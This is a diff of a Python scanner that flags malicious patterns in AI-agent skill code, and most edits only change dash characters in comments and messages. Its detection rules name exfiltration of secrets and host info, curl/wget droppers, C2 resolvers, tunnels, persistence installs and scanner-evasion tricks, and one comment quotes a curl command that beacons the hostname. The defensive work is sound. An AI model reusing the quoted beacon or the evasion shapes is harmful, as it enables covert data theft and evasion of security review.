@@ -11655,7 +11655,7 @@ def _persist_install_function_findings(tree: ast.AST) -> list[tuple[int, str, st
 # does not correlate a write in one artifact file against an import in another
 # (deviation from b917-design.md section D's "artifact-wide" cache, recorded in the
 # B-917 Pulse comment).
-# ─────────────────────────────────────────────────────────────────────────────────────
+# -------------------------------------------------------------------------------------
 
 _B917_LOADER_DIRECT = frozenset({"runpy.run_path", "imp.load_source"})
 _B917_SPEC_CTOR = "importlib.util.spec_from_file_location"
@@ -12452,8 +12452,8 @@ def analyze_python(
     callers can distinguish "clean file" from "file the AST/taint layer could not scan".
 
     `own_host` (C-223): the skill's own declared endpoint host (from its
-    SKILL.md/manifest, computed by the caller — skillast.py has no access to that
-    text itself), used to REWORD (not silence — self-declaration proves disclosed,
+    SKILL.md/manifest, computed by the caller - skillast.py has no access to that
+    text itself), used to REWORD (not silence - self-declaration proves disclosed,
     not trustworthy) HOST_INFO_EXFIL_FLOW when a host-info value flows to the
     skill's OWN disclosed endpoint rather than an undeclared third party.
 
@@ -12482,19 +12482,19 @@ def analyze_python(
         # B-132: precompute fixed-argv-list bindings once so the plain subprocess.*
         # DANGEROUS_SINK check below can tell a safe `subprocess.run(['prog', arg])`
         # (or `cmd = ['prog', arg]; subprocess.run(cmd)`) apart from a spliced/
-        # interpolated command string — independent of taint (this is a shape check,
+        # interpolated command string - independent of taint (this is a shape check,
         # not a taint check; see _subprocess_call_is_fixed_argv).
         list_bindings_by_call = _list_bindings_by_call(tree)
         # B-422 follow-up: names bound to a networking-library session/client/socket
         # constructor (e.g. `s = requests.Session()`), so _is_net_sink recognizes
-        # `s.put(...)` the same as a literal `session.put(...)` — see _net_sink_alias_names.
+        # `s.put(...)` the same as a literal `session.put(...)` - see _net_sink_alias_names.
         net_sink_aliases = _net_sink_alias_names(tree)
         # B-855: computed once per file rather than re-walking `tree` at every
-        # qualifying exec/taint-sink site below — same result, `tree` does not change
+        # qualifying exec/taint-sink site below - same result, `tree` does not change
         # within this call.
         path_aliases = _path_module_aliases(tree)
         # B-910: name -> resolved literal, for the same-file one-hop indirection the
-        # two env-entangled B-140 call sites below resolve — see _secret_name_bindings'
+        # two env-entangled B-140 call sites below resolve - see _secret_name_bindings'
         # own docstring for the uniqueness/scope contract.
         secret_name_bindings = _secret_name_bindings(tree)
         # B-638: (lineno, col_offset) of exec/eval calls proven to run a shipped file, and
@@ -12521,7 +12521,7 @@ def analyze_python(
                 "AST_UNANALYZABLE",
                 "unknown",
                 0,
-                f"could not parse {filename} ({err_type}) — file not analyzed by the AST/taint layer",
+                f"could not parse {filename} ({err_type}) \u2014 file not analyzed by the AST/taint layer",
             )
         ]
 
@@ -12536,21 +12536,21 @@ def analyze_python(
         out.append(ASTFinding(rule, severity, lineno, reason))
 
     # B-907 round 1 gated this loop (and every other one below) on a shared, global
-    # `len(out) >= _MAX_FINDINGS_PER_FILE` — an earlier pass filling `out` with
+    # `len(out) >= _MAX_FINDINGS_PER_FILE` - an earlier pass filling `out` with
     # low-severity noise made every LATER pass's loop break on its first iteration,
     # silently dropping a real crit (TT5_CMD_INJECTION) that pass would otherwise have
     # found. Round 2 gave each pass its own `_MAX_FINDINGS_PER_FILE`-sized budget,
     # which reintroduced the identical starvation WITHIN this one pass, since it is
     # not single-severity: it also emits HARDCODED_PROVIDER_SECRET / OBFUSCATED_EXEC /
     # GETATTR_INDIRECTION / DYNAMIC_IMPORT_EXEC (all crit-capable) inline, in the same
-    # walk, alongside plain DANGEROUS_SINK (info) — 25 padding DANGEROUS_SINK matches
+    # walk, alongside plain DANGEROUS_SINK (info) - 25 padding DANGEROUS_SINK matches
     # early in this loop still filled that budget and broke before a later node's crit
     # was ever reached. Round 2's fix of raising the ceiling to 20x only raised the
     # padding count an attacker needs, so round 3 removes the per-pass ceiling
     # entirely (see the module-level comment above `_MAX_FINDINGS_PER_FILE`): this
     # loop now runs to completion over every node, and the final severity-ordered
     # truncation at `return` below is the sole place `_MAX_FINDINGS_PER_FILE` is
-    # enforced, so a real crit can never be starved out by a lower-severity finding —
+    # enforced, so a real crit can never be starved out by a lower-severity finding -
     # from an earlier pass, or from earlier in this same pass.
     for node in ast.walk(tree):
         if not isinstance(node, ast.Call):
@@ -12559,7 +12559,7 @@ def analyze_python(
         ln = getattr(node, "lineno", 0)
 
         # B-140(b): os.getenv("KEY", "<provider-shaped-literal>") / os.environ.get("KEY", "<...>")
-        # / os.environ.setdefault("KEY", "<...>") — a hardcoded provider-shaped secret
+        # / os.environ.setdefault("KEY", "<...>") - a hardcoded provider-shaped secret
         # used as the literal fallback/default arg. B-910: `setdefault` joined `get` as
         # a recognized call here (it was not matched at all before) since it is the
         # same "default value written into the env" shape.
@@ -12575,13 +12575,13 @@ def analyze_python(
             )
             if is_os_getenv or is_environ_map_call:
                 default_arg = node.args[1]
-                # B-910: a one-hop indirection — `KEY = "sk-..."; os.getenv("K", KEY)`
-                # — resolves the same as the literal, but ONLY when KEY has exactly one
+                # B-910: a one-hop indirection - `KEY = "sk-..."; os.getenv("K", KEY)`
+                # - resolves the same as the literal, but ONLY when KEY has exactly one
                 # same-file BINDING OF ANY KIND (an Assign/AnnAssign, a parameter, a
                 # loop/with/except target, an import, a redefinition as a def/class,
-                # ... — see _secret_name_bindings) and that sole binding is itself an
+                # ... - see _secret_name_bindings) and that sole binding is itself an
                 # Assign/AnnAssign resolving to a hardcoded-secret-shaped literal. A
-                # multi-bound (of ANY kind — e.g. shadowed by an unrelated function
+                # multi-bound (of ANY kind - e.g. shadowed by an unrelated function
                 # parameter of the same name elsewhere in the file), conditional, or
                 # non-literal-resolving Name stays silent here exactly as it did
                 # before this fix (C-135 probes in
@@ -12638,7 +12638,7 @@ def analyze_python(
                     ln,
                     f"a call to {f.id} runs {unshipped_exec[(ln, node.col_offset)]}, a path "
                     "inside the skill that this scan did not analyse as Python (not shipped, "
-                    "or not Python) — whatever is there at runtime runs as code",
+                    "or not Python) \u2014 whatever is there at runtime runs as code",
                 )
                 continue
             # B-640/B-850: `.decode("utf-8")` reading a __file__-relative sibling file
@@ -12685,7 +12685,7 @@ def analyze_python(
                 add("DANGEROUS_SINK", "info", ln, f"a dynamic {f.id} call")
             continue
 
-        # getattr(obj, name)(...) — obfuscated call.
+        # getattr(obj, name)(...) - obfuscated call.
         # B-639: crit REQUIRES the base object resolve to a known-dangerous module
         # (os/subprocess/...) -- for BOTH a dangerous attribute literal and a dynamic
         # attr. A dangerous-shaped attribute NAME alone ("run"/"call" -- also real
@@ -12745,7 +12745,7 @@ def analyze_python(
                         "DYNAMIC_IMPORT_EXEC",
                         "crit",
                         ln,
-                        f"__import__(...).{f.attr}() — dynamic import to evade static scan",
+                        f"__import__(...).{f.attr}() \u2014 dynamic import to evade static scan",
                     )
                 else:
                     reason_target = (
@@ -12757,12 +12757,12 @@ def analyze_python(
                         "DYNAMIC_IMPORT_EXEC",
                         "info",
                         ln,
-                        f"__import__(...).{f.attr}() — dynamic import to {reason_target}",
+                        f"__import__(...).{f.attr}() \u2014 dynamic import to {reason_target}",
                     )
                 continue
 
         # D1 (defensibility): sys.path.insert/append to a relative / writable / env-derived
-        # location — an import-path hijack surface. Anyone who can write that path drops a
+        # location - an import-path hijack surface. Anyone who can write that path drops a
         # module the skill then imports. The benign self-dir form (dirname(__file__)) is clean.
         _sp_arg = _is_sys_path_mutation(node)
         if _sp_arg is not None:
@@ -12771,12 +12771,12 @@ def analyze_python(
                     "IMPORT_FROM_WRITABLE",
                     "info",
                     ln,
-                    "sys.path is extended with a relative / writable / env-derived location — "
+                    "sys.path is extended with a relative / writable / env-derived location \u2014 "
                     "anyone able to write that path can hijack the skill's imports",
                 )
             continue
 
-        # pickle/marshal/dill/torch.loads/load(...) — info (code-exec only if data untrusted).
+        # pickle/marshal/dill/torch.loads/load(...) - info (code-exec only if data untrusted).
         # yaml.load(...) is a special case (F-098/L1-1): unsafe unless an explicit safe
         # Loader= kwarg is given; yaml.safe_load has a different attr name and never reaches
         # here at all, so it stays clean without any special-casing.
@@ -12798,12 +12798,12 @@ def analyze_python(
                         "DESERIALIZE_CODE",
                         "info",
                         ln,
-                        "yaml.load() without a safe Loader (SafeLoader/BaseLoader) — "
+                        "yaml.load() without a safe Loader (SafeLoader/BaseLoader) \u2014 "
                         "arbitrary-code-execution risk if the data is untrusted",
                     )
                 continue
             # B-132: torch.load(..., weights_only=True) is PyTorch's own safe-loading
-            # flag (analogous to yaml's SafeLoader) — it restricts unpickling to a fixed
+            # flag (analogous to yaml's SafeLoader) - it restricts unpickling to a fixed
             # allowlist of tensor/primitive types, so it is not a code-exec-on-load risk
             # the way a bare torch.load()/pickle.load() is. Skip flagging it entirely,
             # mirroring the yaml.load(Loader=SafeLoader) special-case above.
@@ -12824,7 +12824,7 @@ def analyze_python(
                 )
                 continue
 
-        # os.system/popen/exec*/spawn*, subprocess.* — info shell/exec sinks
+        # os.system/popen/exec*/spawn*, subprocess.* - info shell/exec sinks
         if isinstance(f, ast.Attribute):
             base = _attr_base(f.value)
             is_os = base == "os" and (
@@ -12840,7 +12840,7 @@ def analyze_python(
                 "Popen",
             )
             # B-132: a subprocess.* call with a literal, fixed argv list (shell not True)
-            # passes its arguments straight to execve — not through a shell — so it is
+            # passes its arguments straight to execve - not through a shell - so it is
             # far lower risk than a spliced/interpolated command string and should not
             # weigh the same as a genuine shell-exec sink. Skip flagging it entirely here
             # (it still participates fully in the separate taint-aware TT5 pass below,
@@ -12924,7 +12924,7 @@ def analyze_python(
 
     # F-049: env-var / agent-config secret reaching a network sink (SkillSpector E2 env
     # harvesting + E1 external transmission).  Severity is "info" and the checks engine routes it
-    # to a WARN — never an automatic FAIL — because legit skills DO post an env secret to a
+    # to a WARN - never an automatic FAIL - because legit skills DO post an env secret to a
     # trusted endpoint (e.g. ANTHROPIC_API_KEY -> api.anthropic.com) and the scanner cannot
     # know the destination.  The taint must actually connect: a name assigned from an
     # env/config read appears in the sink's args, OR an env read is inline in the args.  An
@@ -12958,17 +12958,17 @@ def analyze_python(
                     "info",
                     getattr(node, "lineno", 0),
                     "an environment-variable or agent-config secret flows into a network "
-                    "sink's URL or body — verify the destination is trusted (possible exfiltration)",
+                    "sink's URL or body \u2014 verify the destination is trusted (possible exfiltration)",
                 )
 
-    # C-203: HOST_INFO_EXFIL_FLOW — host/machine-identity info (hostname, platform/uname,
+    # C-203: HOST_INFO_EXFIL_FLOW - host/machine-identity info (hostname, platform/uname,
     # git remote) reaching an outbound sink: covert telemetry / phone-home. Two shapes:
     # (a) a Python network-library call (_is_net_sink) whose URL/body/params carries a
     #     host-info-tainted value or an inline host-info call; (b) a shell-exec sink
     #     (os.system/os.popen/subprocess) whose command string contains BOTH a curl/wget
-    #     fetch AND a host-identity signal — covers the concat-built
+    #     fetch AND a host-identity signal - covers the concat-built
     #     `'curl -s ' + URL + '/eval_chain -d h=$(hostname)'` shape that has no single
-    #     contiguous literal for a plain curl|sh regex to match. Severity "info" — WARN-first,
+    #     contiguous literal for a plain curl|sh regex to match. Severity "info" - WARN-first,
     #     same rationale as ENV_EXFIL_FLOW (crash-reporters/telemetry are dual-use).
     if _HOST_INFO_SIGNAL_RE.search(source):
         host_src_tainted = _host_info_tainted_names(tree)
@@ -13007,8 +13007,8 @@ def analyze_python(
                             "HOST_INFO_EXFIL_FLOW",
                             "info",
                             ln,
-                            "verify independently — self-declaration alone doesn't prove the "
-                            "destination is trustworthy — host/machine-identity info "
+                            "verify independently \u2014 self-declaration alone doesn't prove the "
+                            "destination is trustworthy \u2014 host/machine-identity info "
                             "(hostname/platform/git-remote) flows into a network sink matching "
                             "the skill's OWN declared endpoint (disclosed, not covert)",
                         )
@@ -13018,7 +13018,7 @@ def analyze_python(
                             "info",
                             ln,
                             "host/machine-identity info (hostname/platform/git-remote) flows "
-                            "into a network sink — verify the destination is trusted (possible "
+                            "into a network sink \u2014 verify the destination is trusted (possible "
                             "covert telemetry / phone-home)",
                         )
                 continue
@@ -13044,17 +13044,17 @@ def analyze_python(
                         "info",
                         ln,
                         f"a {shell_sink_desc} shell command built with a curl/wget fetch AND a "
-                        "host-identity value (hostname/whoami/git-remote) — possible covert "
+                        "host-identity value (hostname/whoami/git-remote) \u2014 possible covert "
                         "telemetry beacon",
                     )
                     break
 
-    # B-342 (T09/SkillTrustBench V_EXCESSIVE_TELEMETRY): EXCESSIVE_TELEMETRY_FLOW — a
+    # B-342 (T09/SkillTrustBench V_EXCESSIVE_TELEMETRY): EXCESSIVE_TELEMETRY_FLOW - a
     # function combining >=2 over-collection axes (bulk env dump, recursive/bulk
     # filesystem walk, bulk directory listing, shell/command-history file read) whose
     # value reaches a network sink. See the constant block near _TELEMETRY_SIGNAL_RE
-    # (top of file) for the full rationale, including why the disclosure gate — not
-    # this AST shape alone — is what actually separates a hidden collector from a
+    # (top of file) for the full rationale, including why the disclosure gate - not
+    # this AST shape alone - is what actually separates a hidden collector from a
     # disclosed, legitimate telemetry/diagnostics/backup skill.
     if _TELEMETRY_SIGNAL_RE.search(source):
         collector_funcs = _telemetry_collector_funcnames(tree)
@@ -13088,14 +13088,14 @@ def analyze_python(
                         "a function collects data across multiple over-collection axes "
                         "(bulk env-var dump, recursive/bulk filesystem or directory "
                         "enumeration, or a shell/command-history file read) and the "
-                        "assembled value flows into a network sink — verify this is "
+                        "assembled value flows into a network sink \u2014 verify this is "
                         "disclosed telemetry, not a hidden collector",
                     )
 
-    # C-205: DROPPER_DOWNLOAD_TO_TMP — an argv-list curl/wget subprocess call staging a
+    # C-205: DROPPER_DOWNLOAD_TO_TMP - an argv-list curl/wget subprocess call staging a
     # script into a writable/tmp-like path, with no literal pipe for B100's regex to
     # match (the URL is typically a variable too). Checked independently of the loops
-    # above — this is a shape check on the argv list, not a taint flow.
+    # above - this is a shape check on the argv list, not a taint flow.
     for node in ast.walk(tree):
         if not _is_curl_wget_argv_call(node):
             continue
@@ -13106,7 +13106,7 @@ def analyze_python(
             and out_path.lower().endswith(_SCRIPT_LIKE_EXTS)
         ):
             # C-224: a literal URL on the curated first-party installer allowlist
-            # (fixed project data, not skill-influenceable) skips — matches B100's
+            # (fixed project data, not skill-influenceable) skips - matches B100's
             # own established behavior for the identical allowlist, so the download-
             # then-exec form of a trusted installer URL is no longer WARN-only while
             # the piped form of the SAME URL already passes.
@@ -13118,13 +13118,13 @@ def analyze_python(
                 "info",
                 getattr(node, "lineno", 0),
                 f"curl/wget argv-list call downloads a script to a writable path "
-                f"({out_path}) — staged dropper shape (no literal pipe, evades a plain "
+                f"({out_path}) \u2014 staged dropper shape (no literal pipe, evades a plain "
                 "curl|sh match)",
             )
 
-    # TUNNEL_LAUNCH_ARGV — an argv-list tunnel/mesh-VPN launch
+    # TUNNEL_LAUNCH_ARGV - an argv-list tunnel/mesh-VPN launch
     # primitive (see the module comment above `_TUNNEL_ARGV_BARE_PROGRAMS`). info (not
-    # crit), matching DROPPER_DOWNLOAD_TO_TMP/CHUNKED_FILE_EXEC's grade — checks/_vet.py's
+    # crit), matching DROPPER_DOWNLOAD_TO_TMP/CHUNKED_FILE_EXEC's grade - checks/_vet.py's
     # check_installed_skills routes this rule through its own explicit continue-branch
     # (mirrors CHUNKED_FILE_EXEC's guard), so it can never become FAIL-capable there
     # regardless of this severity label; checks/_content.py's check_tunnel_enrollment
@@ -13139,12 +13139,12 @@ def analyze_python(
             "info",
             getattr(node, "lineno", 0),
             f"argv-list subprocess call launches a tunnel/mesh-VPN primitive: "
-            f"[{argv_repr}] — the idiomatic Python form a text-regex scan of the same "
+            f"[{argv_repr}] \u2014 the idiomatic Python form a text-regex scan of the same "
             "skill's source would miss",
         )
 
-    # B336: CHUNKED_FILE_EXEC — a locally-defined helper reads and joins multiple
-    # chunked/part files at runtime, and the assembled result is exec()'d/eval()'d — the
+    # B336: CHUNKED_FILE_EXEC - a locally-defined helper reads and joins multiple
+    # chunked/part files at runtime, and the assembled result is exec()'d/eval()'d - the
     # split-by-file scanner-evasion loader shape. info (not crit): a corroborated-but-new
     # heuristic; checks/_vet.py's check_installed_skills routes this rule through its own
     # explicit continue-branch, so it can never reach that function's generic crit/
@@ -13157,7 +13157,7 @@ def analyze_python(
     # runtime and executed are a remote code loader by construction.
     # B-993: `facts` threaded through so a bare `urlopen`/`urlretrieve` inside the
     # local helper (reached via `from urllib.request import ...`) is recognised too
-    # (previously only the attribute-call spelling was) — see
+    # (previously only the attribute-call spelling was) - see
     # `_remote_code_load_findings`'s own docstring.
     for _rcl_ln, _rcl_reason in _remote_code_load_findings(tree, facts):
         add("REMOTE_CODE_LOAD", "crit", _rcl_ln, _rcl_reason)
@@ -13166,7 +13166,7 @@ def analyze_python(
     # breaks name-level taint, so TT5 below cannot reach it.
     # B-927: `facts` threaded through so a bare `urlopen`/`urlretrieve` reached via
     # `from urllib.request import ...` is recognised too (previously only the
-    # attribute-call spelling, `urllib.request.urlopen(...)`, was) — see
+    # attribute-call spelling, `urllib.request.urlopen(...)`, was) - see
     # `_is_remote_fetch_call`'s own docstring. B-993 later closed the same gap for
     # REMOTE_CODE_LOAD (above) and DEADDROP_RESOLVER (below), each on its own merits.
     for _se_ln, _se_path in _staged_exec_findings(
@@ -13177,10 +13177,10 @@ def analyze_python(
             "crit",
             _se_ln,
             f"content fetched from a remote URL is written to {_se_path} and that path is "
-            "then executed — staged remote code execution",
+            "then executed \u2014 staged remote code execution",
         )
 
-    # F-159: dead-drop C2 resolver — periodic poll -> decode -> exec (see the module
+    # F-159: dead-drop C2 resolver - periodic poll -> decode -> exec (see the module
     # comment above `_SLEEP_BASES`). confirmed dataflow is crit -> FAIL; the three
     # ingredients merely co-located (no confirmed dataflow) is info -> WARN only.
     # list_bindings_by_call (already computed above, B-132) is threaded through so a
@@ -13188,7 +13188,7 @@ def analyze_python(
     # argv list for the command-vs-data-argument split (F-159 follow-up).
     # B-993: `facts` also threaded through so a bare `urlopen`/`urlretrieve` (`from
     # urllib.request import ...`) is recognised on the poll/fetch leg AND (round 2,
-    # same ticket) the decode leg and the sink loop's own inline-decode check — see
+    # same ticket) the decode leg and the sink loop's own inline-decode check - see
     # `_deaddrop_resolver_findings`'s own docstring for the exact scope.
     _dd_confirmed, _dd_ambiguous = _deaddrop_resolver_findings(tree, list_bindings_by_call, facts)
     for _dd_ln, _dd_reason in _dd_confirmed:
@@ -13271,13 +13271,13 @@ def analyze_python(
         or _has_inline_ssrf_source
         or _has_inline_tt4_source
     ):
-        # This is the TT5/TT4/SSRF taint pass — the one whose INTER-pass starvation
+        # This is the TT5/TT4/SSRF taint pass - the one whose INTER-pass starvation
         # (round 1) was the concrete repro (a TT5_CMD_INJECTION crit lost behind 25+
         # earlier DANGEROUS_SINK info findings from the loop above). It is ALSO,
         # itself, a mixed-severity pass exactly like the first loop above
         # (TT5_CMD_INJECTION crit alongside TT5_ARG_INJECTION/TT4_FILE_NET/TT_SSRF
-        # info in the same walk), so — per the module-level comment above
-        # `_MAX_FINDINGS_PER_FILE` (round 3) — it has no per-pass ceiling of its own
+        # info in the same walk), so - per the module-level comment above
+        # `_MAX_FINDINGS_PER_FILE` (round 3) - it has no per-pass ceiling of its own
         # either; every candidate reaches `out` and the final severity-ordered
         # truncation at `return` is the sole enforcement point.
         for node in ast.walk(tree):
@@ -13355,10 +13355,10 @@ def analyze_python(
                                     add("ARTIFACT_READ_UNPROVEN", "info", _up_ln, _up_reason)
                         continue
                     # A subprocess argv-list call (shell=False, fixed program) is only
-                    # argument injection, not command injection — do not escalate to crit.
+                    # argument injection, not command injection - do not escalate to crit.
                     # B-413 layer 2: also downgraded when EVERY intra-file call site to
                     # a wrapper function binds this tainted parameter to a hardcoded,
-                    # untainted-program argv list — see
+                    # untainted-program argv list - see
                     # _subprocess_taint_is_command_injection's own docstring.
                     if exec_name.startswith(
                         "subprocess."
@@ -13381,7 +13381,7 @@ def analyze_python(
                             "info",
                             ln,
                             f"external input flows into {exec_name} as a non-program list argument "
-                            "(shell=False) — argument injection, not command injection",
+                            "(shell=False) \u2014 argument injection, not command injection",
                         )
                         continue
                     flow_kind = "direct" if direct else "indirect"
@@ -13389,7 +13389,7 @@ def analyze_python(
                         "TT5_CMD_INJECTION",
                         "crit",
                         ln,
-                        f"external input flows into {exec_name} ({flow_kind} flow) — command/code injection",
+                        f"external input flows into {exec_name} ({flow_kind} flow) \u2014 command/code injection",
                     )
                     continue
 
@@ -13407,7 +13407,7 @@ def analyze_python(
                             "TT4_FILE_NET",
                             "info",
                             ln,
-                            f"file-read contents flow into {net_name} ({flow_kind} flow) — data exfiltration risk",
+                            f"file-read contents flow into {net_name} ({flow_kind} flow) \u2014 data exfiltration risk",
                         )
                     continue
 
@@ -13429,20 +13429,20 @@ def analyze_python(
                             "TT_SSRF",
                             "info",
                             ln,
-                            f"externally-controlled URL flows into {ssrf_name} with internal endpoint literal present ({flow_kind} flow) — SSRF",
+                            f"externally-controlled URL flows into {ssrf_name} with internal endpoint literal present ({flow_kind} flow) \u2014 SSRF",
                         )
                     else:
                         add(
                             "TT_SSRF",
                             "info",
                             ln,
-                            f"externally-controlled URL flows into {ssrf_name} ({flow_kind} flow) — SSRF risk",
+                            f"externally-controlled URL flows into {ssrf_name} ({flow_kind} flow) \u2014 SSRF risk",
                         )
 
     out.extend(_conditional_sink_findings(tree))
     out.extend(_shell_injection_risk_findings(tree))
 
-    # B-140(a): os.environ["KEY"] = "<provider-shaped-literal>" — an unconditional
+    # B-140(a): os.environ["KEY"] = "<provider-shaped-literal>" - an unconditional
     # overwrite of an env var with a hardcoded provider-shaped token. A separate small
     # loop (rather than folding into the ast.Call walk above) since Assign is a
     # different node shape and the Call loop's control flow is continue-heavy.
@@ -13460,13 +13460,13 @@ def analyze_python(
         ) or (isinstance(tv, ast.Name) and tv.id == "environ")
         if not is_os_environ:
             continue
-        # B-910: a one-hop indirection — `KEY = "sk-..."; os.environ["K"] = KEY` —
+        # B-910: a one-hop indirection - `KEY = "sk-..."; os.environ["K"] = KEY` -
         # resolves the same as the literal, but ONLY when KEY has exactly one
         # same-file BINDING OF ANY KIND (an Assign/AnnAssign, a parameter, a
-        # loop/with/except target, an import, a redefinition as a def/class, ... —
+        # loop/with/except target, an import, a redefinition as a def/class, ... -
         # see _secret_name_bindings) and that sole binding is itself an
         # Assign/AnnAssign resolving to a hardcoded-secret-shaped literal. A
-        # multi-bound (of ANY kind — e.g. shadowed by an unrelated function
+        # multi-bound (of ANY kind - e.g. shadowed by an unrelated function
         # parameter of the same name elsewhere in the file), conditional, or
         # non-literal-resolving Name stays silent here exactly as it did before this
         # fix (C-135 probes in tests/test_b910_env_entangled_name_indirection.py).
@@ -13495,16 +13495,16 @@ def analyze_python(
         )
 
     # B-999: os.environ.update({"KEY": "<provider-shaped-literal>"}) /
-    # os.environ.update(KEY="<provider-shaped-literal>") — two more env-write shapes
+    # os.environ.update(KEY="<provider-shaped-literal>") - two more env-write shapes
     # the two B-140 call sites above (the `os.environ["K"] = value` Subscript-assign
     # loop just above, and the `os.getenv`/`.get`/`.setdefault` default-arg call
     # earlier in this function) do not reach: `dict.update`'s dict-literal positional
     # arg and its keyword arguments. Same predicate, same one-hop
     # `_secret_name_bindings` indirection, same HARDCODED_PROVIDER_SECRET rule name
-    # and crit severity as the Subscript-assign loop — this is the identical
+    # and crit severity as the Subscript-assign loop - this is the identical
     # "hardcoded secret written unconditionally into the environment" shape, just a
     # third call form. Scoped narrowly per B-999 triage: only the dict-literal value
-    # and keyword-argument forms are handled here — NOT a name bound to the dict
+    # and keyword-argument forms are handled here - NOT a name bound to the dict
     # itself (`d = {"K": "sk-..."}; os.environ.update(d)`, still a residual, same as
     # `_secret_name_bindings`'s own documented `os.environ.update({K: <name>})` note)
     # and not `os.putenv`/two-hop indirection/attribute targets, all explicitly out
@@ -13558,14 +13558,14 @@ def analyze_python(
                 continue  # a `**expr` unpack, not a literal key
             _b999_env_update_secret(kw.arg, kw.value, ln)
 
-    # B-740: a plain assignment of a provider-shaped literal — e.g. module-level
-    # `STRIPE_SECRET_KEY = "sk_live_..."` — reached neither os.environ-entangled shape
+    # B-740: a plain assignment of a provider-shaped literal - e.g. module-level
+    # `STRIPE_SECRET_KEY = "sk_live_..."` - reached neither os.environ-entangled shape
     # above and produced NO finding at all. Third call site of the same
     # `_is_hardcoded_provider_secret` predicate (the predicate itself is unchanged);
     # `ast.walk` does not distinguish scope, so this also catches the identical shape
     # inside a function body or a class body (a class attribute target is `ast.Name`
     # too), not only true module level. Only a single, simple `Name` target is matched
-    # — a tuple/attribute/subscript target, or a value that isn't a plain string
+    # - a tuple/attribute/subscript target, or a value that isn't a plain string
     # constant (an f-string, a `+` concatenation, a name reference), is left alone; a
     # value split across adjacent string-literal boundaries (`"a" "b"`) still matches,
     # since Python folds those into one `ast.Constant` before this ever runs.
@@ -13573,11 +13573,11 @@ def analyze_python(
     # C-135 note (B-893, supersedes the B-740 note this replaces): the B-740 note above
     # called the corpus's `tests/conftest.py` MOCK_* fixture shape "pre-existing,
     # shared" with the two os.environ-entangled call sites above. That was wrong for
-    # THIS shape specifically — measured on the SkillTrustBench corpus (B-543
+    # THIS shape specifically - measured on the SkillTrustBench corpus (B-543
     # re-measure, 2026-09-23): this plain-assignment site alone produced 32 new
     # gold-normal FAILs (FP_TEST_FIXTURE class, `tests/conftest.py` `MOCK_*`
     # assignments, one byte-identical template with 0 pytest-shape signals) that did
-    # NOT exist before this call site shipped in v4.2.1 — the two env-entangled sites
+    # NOT exist before this call site shipped in v4.2.1 - the two env-entangled sites
     # require actual `os.environ`/`getenv` entanglement, which a plain mock assignment
     # never has, so they never reproduced these FAILs. The 32 FAILs are new in v4.2.1,
     # not pre-existing.
@@ -13585,8 +13585,8 @@ def analyze_python(
     # Fix (Dave's D2 on B-543): this call site gets its OWN rule name,
     # `HARDCODED_PROVIDER_SECRET_ASSIGN`, distinct from `HARDCODED_PROVIDER_SECRET`
     # (kept unchanged on the two env-entangled sites above, which stay crit/FAIL). The
-    # routing decision — WARN for an ordinary file, evidence-only (never a verdict
-    # winner) inside a test-fixture-named file — lives downstream in
+    # routing decision - WARN for an ordinary file, evidence-only (never a verdict
+    # winner) inside a test-fixture-named file - lives downstream in
     # `checks/_vet.py`'s B13 AST loop and `_AST_NEVER_FAIL_RULES`, keyed on the new
     # rule name; this Layer-1 module makes no test-fixture-path judgment itself, so no
     # Layer-2 import is needed here (the prior note's "banned reverse dependency"
@@ -13614,7 +13614,7 @@ def analyze_python(
         )
 
     # F-177/B375: sitecustomize/PYTHONSTARTUP persistence install, scoped to a single
-    # function — see the module comment above `_AST_SITECUSTOMIZE_TARGET_RE`.
+    # function - see the module comment above `_AST_SITECUSTOMIZE_TARGET_RE`.
     for _pi_ln, _pi_mech, _pi_fn in _persist_install_function_findings(tree):
         if _pi_mech == "A":
             add(
@@ -13622,7 +13622,7 @@ def analyze_python(
                 "info",
                 _pi_ln,
                 f"{_pi_fn}() computes a site-packages sitecustomize/usercustomize "
-                "target and opens a file for write/append — auto-execution "
+                "target and opens a file for write/append \u2014 auto-execution "
                 "persistence install (mechanism A)",
             )
         else:
@@ -13631,7 +13631,7 @@ def analyze_python(
                 "info",
                 _pi_ln,
                 f"{_pi_fn}() names a shell-rc path and a PYTHONSTARTUP assignment "
-                "while opening a file for write/append — PYTHONSTARTUP persistence "
+                "while opening a file for write/append \u2014 PYTHONSTARTUP persistence "
                 "install (mechanism B)",
             )
 
@@ -13639,10 +13639,10 @@ def analyze_python(
         return out
 
     # More candidates survived the per-PASS budgets above than the
-    # per-FILE cap allows overall. Truncate by SEVERITY, never by discovery order — a
+    # per-FILE cap allows overall. Truncate by SEVERITY, never by discovery order - a
     # crit a later pass found must outrank an earlier pass's info findings, not lose to
     # them just because that pass ran first and filled `out` first. `sorted` is stable,
-    # so within one severity, findings keep the discovery order they already had —
+    # so within one severity, findings keep the discovery order they already had -
     # deterministic, not an artifact of dict/set iteration order. One slot is reserved
     # for an explicit disclosure finding, so a capped file reads as visibly incomplete
     # (never silently "clean beyond what was reported") while the return value still
@@ -13655,7 +13655,7 @@ def analyze_python(
             "info",
             0,
             f"{suppressed} additional lower-priority AST/taint finding(s) suppressed by "
-            f"the per-file cap ({_MAX_FINDINGS_PER_FILE}) — this file's findings are "
+            f"the per-file cap ({_MAX_FINDINGS_PER_FILE}) \u2014 this file's findings are "
             "incomplete; crit findings are kept ahead of info ones",
         )
     )
@@ -13665,13 +13665,13 @@ def analyze_python(
 # B-190: a secret placed in headers=/auth=/cert= is deliberately excluded from
 # ENV_EXFIL_FLOW above (_ENV_AUTH_KWARGS) because that's the normal way a skill
 # authenticates to its own API. But the exclusion happens INSIDE analyze_python's own
-# loop, before any ASTFinding is ever created — so unlike other "info"-severity findings
+# loop, before any ASTFinding is ever created - so unlike other "info"-severity findings
 # that get silently dropped by check_installed_skills' cascade (still visible to
 # adjudication.py's _recover_dropped_taint, which re-runs analyze_python), this case is
 # never computed at all and so can never reach even the advisory judge-packet. This
 # sibling walk computes exactly the excluded case, always "info" severity, for
 # adjudication.py to surface as an UNKNOWN judge-packet item. Never called from
-# analyze_python or CHECKS — check_installed_skills' PASS/WARN/FAIL cascade never sees
+# analyze_python or CHECKS - check_installed_skills' PASS/WARN/FAIL cascade never sees
 # these findings, so this cannot introduce a new false-FAIL (Golden Rule #5).
 def analyze_env_auth_kwarg_exfil(source: str, filename: str = "<skill>") -> list[ASTFinding]:
     try:
@@ -13713,14 +13713,14 @@ def analyze_env_auth_kwarg_exfil(source: str, filename: str = "<skill>") -> list
         seen.add(lineno)
         # C-340: surface the destination host when the URL is a plain string literal
         # (the same resolver B-190's sibling walk already uses, line ~3115) so the
-        # host-agent judge adjudicating this UNKNOWN has something concrete to check —
